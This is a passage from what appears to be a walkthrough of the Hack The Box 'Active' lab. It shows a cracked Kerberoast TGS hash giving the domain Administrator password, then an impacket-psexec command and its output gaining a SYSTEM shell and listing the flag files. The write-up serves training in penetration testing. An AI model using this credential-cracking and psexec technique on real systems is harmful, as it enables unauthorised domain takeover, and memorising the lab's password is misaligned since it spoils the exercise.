b73a769bc0491fd3e9099811ceebaadbd777a1267a0f8904a7a562224a4e28c84723789fce769cba7104ea0ddbd2a9d0cd5ead1cd3e54d8c3d4fd18f6e7df29f34694e3d86ea372c6e54fac4ed923df589bf6cb29c0cd48ca19dac4253e58671c9bd5a38c14a6730e0278db95f824d3084de2acde4ceb609c744aef6b53e88f2302ffc2d2be633d54e927c1292d17679993f635571b2c59dc3e6465a9eb96007ad120f2de57d967e54e9b0143dcbadb92135d8ef25b7de117aaae25f6c67ad6fc6dc2013154745e7d06f9da58343cf5cff4b46172f1ec18449c3e5b00748053a6bb8312c6e5d9d00cdbcc79e58810eb3df027c0f70bd70ce10e39106c89e855102392dae1cb223389c82dcef5bc2fb7e1b321f94450096b9512b5f350009e77f4b47a709807fe4515adb015744465460fb4ddc30b89f95e762f165182893fbca48b960c1056370760d8db21e5fe863c3c4c615202e146035dfec18b4' rockyou.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c0d42b1422a9655ee6dc01a4f44eb735$6b061bdc09073b4e789f7cef99f90a9c99c8439672e666f4c30a15fcb0a18e1effb610a9e9096e52504259fc68d99deaaeeded770ea1ff38b41a5674a624e08ec0a4cd81635a9912e4504dcbf74ffb338e56d643a37d050a5a77c23ad66bc8a23f561a596c3de8956d6ce390466588ed2efb6bc34be1d2f1af318959d8f6b66f01add6438795f3bde37520e6a57e4fd441d98a7f62dfeafb4035bb3221b65d8f43dce07616d572522dd05926b29f844c1da56302b32943bf8e52f3372e8d35e13014eb44971fd2cd38b9df13e022cfb1feb1eac999969cd2d3d009748b1b22ee0ac247734300d74b038db51a82836be4557c85b2afbc7dba1b8e3252ce6ee9693bf8d49d843c27e3639586a4998cef971b3f62f69ac4dbf8e6c4c3d94903fb372a42349f79f3a65ff868c36bd75dfae3cf0645582a9041f50ae370b0544667d1a5c2689e3f4da76b352e90097c37dde688a746bf1d54d6f3aa4cbc7ade1d1b8a704b58205326643642da66443d3de272abc7597cfee34f83c614025cdd75103d63905d840ff4e44bd2ac82389b93587b3058a9472bc2559375e6b87c8a1acaf02afb3fa465bca0393905a07f18592d49faeab5344fdcbace9673fd28941f8a64399311acf66dd3e6587772e2e5885b98e0659650075d2d51f2229f5b4caf946da24b63fab615efa0cab35201036d8b5ee4cba4a4a2db0dc3725d3ac7b8d3955304644f01afd418364bc90b66e31ee4d32d5bbd782072cab7e965204e83feb73a769bc0491fd3e9099811ceebaadbd777a1267a0f8904a7a562224a4e28c84723789fce769cba7104ea0ddbd2a9d0cd5ead1cd3e54d8c3d4fd18f6e7df29f34694e3d86ea372c6e54fac4ed923df589bf6cb29c0cd48ca19dac4253e58671c9bd5a38c14a6730e0278db95f824d3084de2acde4ceb609c744aef6b53e88f2302ffc2d2be633d54e927c1292d17679993f635571b2c59dc3e6465a9eb96007ad120f2de57d967e54e9b0143dcbadb92135d8ef25b7de117aaae25f6c67ad6fc6dc2013154745e7d06f9da58343cf5cff4b46172f1ec18449c3e5b00748053a6bb8312c6e5d9d00cdbcc79e58810eb3df027c0f70bd70ce10e39106c89e855102392dae1cb223389c82dcef5bc2fb7e1b321f94450096b9512b5f350009e77f4b47a709807fe4515adb015744465460fb4ddc30b89f95e762f165182893fbca48b960c1056370760d8db21e5fe863c3c4c615202e146035dfec18b4:Ticketmaster1968
```

`active.htb\Administrator`'s password is `Ticketmaster1968`.

Use this credential to access the domain controller and read both the user and root flags.

```bash
$ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.250.171 -dc-ip 10.129.250.171
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.250.171.....
[*] Found writable share ADMIN$
[*] Uploading file YzQIfNuQ.exe
[*] Opening SVCManager on 10.129.250.171.....
[*] Creating service xekp on 10.129.250.171.....
[*] Starting service xekp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>dir C:\Users\SVC_TGS\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 2AF3-72E4

 Directory of C:\Users\SVC_TGS\Desktop

21/07/2018  05:14 úú    <DIR>          .
21/07/2018  05:14 úú    <DIR>          ..
21/07/2018  05:06 úú                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  21.341.466.624 bytes free

C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 2AF3-72E4

 Directory of C:\Users\Administrator\Desktop

21/01/2021  06:49 úú    <DIR>          .
21/01/2021  06:49 úú    <DIR>          ..
21/07/2018  05:06 úú                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  21.341.466.624 bytes free
```
